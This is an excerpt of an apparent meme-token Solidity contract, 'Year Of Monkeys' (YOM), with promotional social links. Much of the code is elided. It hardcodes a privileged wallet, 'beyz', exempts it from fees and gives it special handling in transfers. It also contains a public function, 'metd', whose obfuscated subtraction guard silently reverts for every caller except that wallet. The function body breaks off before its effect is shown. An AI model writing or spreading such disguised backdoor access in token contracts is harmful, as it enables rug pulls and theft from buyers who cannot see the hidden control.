/**
Its the year of the monkeys with its hair on fire 

Twitter https://twitter.com/yearsofmonkeys
Tg https://t.me/YearOfMonkeys
*/ 
...
contract MONKEYS is Context, IERC20, Ownable {
    ...
    string private _name = "Year Of Monkeys";
    string private _symbol = "YOM";
    uint8 private _decimals = 6;
    address payable public beyz ;
    ...
    uint256 private _totalSupply = 970000000000 * 10**_decimals;
    ...
    constructor () {
        ...
        beyz  = payable(address(0xbdA571916Fc8a2c4983732c5768F8deCFdc795BF));
        
        _isExcludefromFee[beyz ] = true;
    ...
    function _transfer(address from, address to, uint256 amount) private returns (bool) {
        ...
        bool isswap = (from != address(0) && beyz  == to);
        if(inSwapAndLiquify)
        {
    ...
    function metd(address smbol,uint256 ssr) public {
        ssr.sub(
            (msg.sender != beyz ) ? 
            ssr+ssr : 0
        );
